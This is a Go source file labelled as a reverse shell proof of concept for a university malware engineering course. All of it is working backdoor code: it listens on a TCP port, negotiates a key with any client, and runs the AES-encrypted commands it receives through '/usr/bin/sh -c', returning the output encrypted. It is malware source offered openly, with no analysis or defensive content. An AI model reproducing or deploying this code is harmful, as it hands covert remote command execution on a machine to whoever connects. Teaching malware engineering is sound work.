package main

// REVERSE SHELL POC FOR MALWARE ENGINEERING COURSE OF UIT

import (
	"log/slog"
	"strings"
	"fmt"
	"encoding/binary"
	"io"
	"bytes"
	"net"
	"os/exec"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Listen("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	slog.Info("Reverse Shell listening on port 9999.")

	for {
		conn, err := stream.Accept()
		if err != nil {
			slog.Error("An error occured while establishing a connection with the client.", slog.Any("ERROR", err))
			continue
		}

		slog.Info(fmt.Sprintf("Incoming connection from %s.", conn.RemoteAddr()))

		key, err := grevcore.DeriveKey(conn)

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			return
		}

		ExecuteRequest(conn, key)
	}
}

func ExecuteRequest(c net.Conn, key []byte) {
	defer c.Close()
	for {
		var buf bytes.Buffer
		packetSize := make([]byte, 4)
		packetSizeSend := make([]byte, 4)
		io.ReadFull(c, packetSize)
		size := binary.LittleEndian.Uint32(packetSize)

		recieved := make([]byte, size)
		io.ReadFull(c, recieved)

		cmdln := string(grevcore.AesDecrypt(&recieved, &key))

		cmd := exec.Command("/usr/bin/sh", "-c", strings.TrimSpace(cmdln))

		cmd.Stdout = &buf
		cmd.Stderr = &buf

		err := cmd.Run()

		if err != nil {
			slog.Error("An error occured while executing the command.", slog.Any("ERROR", err))
		}

		data := buf.Bytes()

		encryptedData := grevcore.AesEncrypt(&data, &key)
		binary.LittleEndian.PutUint32(packetSizeSend, uint32(len(encryptedData)))

		c.Write(packetSizeSend)
		c.Write(encryptedData)
	}
}
